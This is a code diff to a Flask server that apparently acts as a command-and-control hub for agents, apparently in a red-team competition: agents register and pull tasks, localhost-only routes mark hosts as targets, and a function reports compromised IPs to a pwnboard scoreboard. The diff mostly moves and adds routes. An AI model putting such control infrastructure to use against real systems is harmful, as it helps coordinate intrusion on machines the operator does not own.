@@ -28,13 +28,24 @@ class Task(db.Model):
 with app.app_context():
     db.create_all()
 
-def restrict_remote(func):
+#FUNCTIONS:
+
+def restrict_remote(func): # Decorator to restrict routes to localhost only
     def wrapper(*args, **kwargs):
         if request.remote_addr not in ['127.0.0.1',"::1"]:
             abort(403)
         return func(*args, **kwargs)
     wrapper.__name__ = func.__name__  # To preserve function name for Flask routing
     return wrapper
+
+def update_pwnboard(ip):
+    try:
+        data = {'ip': ip, 'type': "festivus"}
+        req = requests.post("https://pwnboard.win/pwn/boxaccess", json=data, timeout=3)
+    except:
+        pass
+
+#ROUTES:
 
 @app.route('/register', methods=['POST'])
 def register_agent():
@@ -53,13 +64,6 @@ def register_agent():
             return jsonify({"message": "Agent registration renewed"}), 200
     return jsonify({"error": "Invalid data"}), 400
 
-@app.route('/get-agents', methods=['GET'])
-@restrict_remote
-def get_agents():
-    agents = Agent.query.all()
-    agents = [{"agent_id": agent.agent_id, "status": agent.status} for agent in agents]
-    return jsonify(agents)
-
 @app.route('/targets', methods=['GET'])
 def get_targets():
     targets = ""
@@ -73,13 +77,6 @@ def submit_results():
     try:
         print(request.json)
         return jsonify({'status': 'success'})
-    except:
-        pass
-
-def update_pwnboard(ip):
-    try:
-        data = {'ip': ip, 'type': "festivus"}
-        req = requests.post("https://pwnboard.win/pwn/boxaccess", json=data, timeout=3)
     except:
         pass
 
@@ -107,6 +104,57 @@ def get_task():
             return jsonify(task_data)
     return jsonify({'action': 'NULL'})
 
+
+
+# Localhost only routes for manager
+@app.route('/get-agents', methods=['GET'])
+@restrict_remote
+def get_agents():
+    agents = Agent.query.all()
+    agents = [{"agent_id": agent.agent_id, "status": agent.status} for agent in agents]
+    return jsonify(agents)
+
+@app.route('/set-targets', methods=['POST'])
+@restrict_remote
+def set_targets():
+    data = request.json
+    ips = data.get('ips')
+    if ips:
+        for ip in ips:
+            agent = Agent.query.filter_by(agent_id=ip).first()
+            if agent:
+                agent.targeted = True
+                db.session.commit()
+        return jsonify({"message": "Targets set successfully"}), 200
+    return jsonify({"error": "Invalid data"}), 400
+
+@app.route('/untarget', methods=['POST'])
+@restrict_remote
+def untarget():
+    data = request.json
+    ips = data.get('ips')
+    if ips: 
+        for ip in ips:
+            agent = Agent.query.filter_by(agent_id=ip).first()
+            if agent:
+                agent.targeted = False
+                db.session.commit()
+        return jsonify({"message": "Targets unset successfully"}), 200
+    return jsonify({"error": "Invalid data"}), 400
+
+@app.route('/clear-targets', methods=['POST'])
+@restrict_remote
+def clear_targets():
+    agents = Agent.query.filter_by(targeted=True).all()
+    for agent in agents:
+        agent.targeted = False
+    db.session.commit()
+    return jsonify({"message": "Targets cleared successfully"}), 200
+    
+
+
+
+#Main Page
 @app.route('/', methods=['GET'])
 def homepage():
     webpage_content = """
@@ -116,7 +164,6 @@ def homepage():
     for agent in Agent.query.all():
         webpage_content += f"<p>{agent.agent_id} - {agent.status}</p>"
     return webpage_content
-
 
 
 def main():
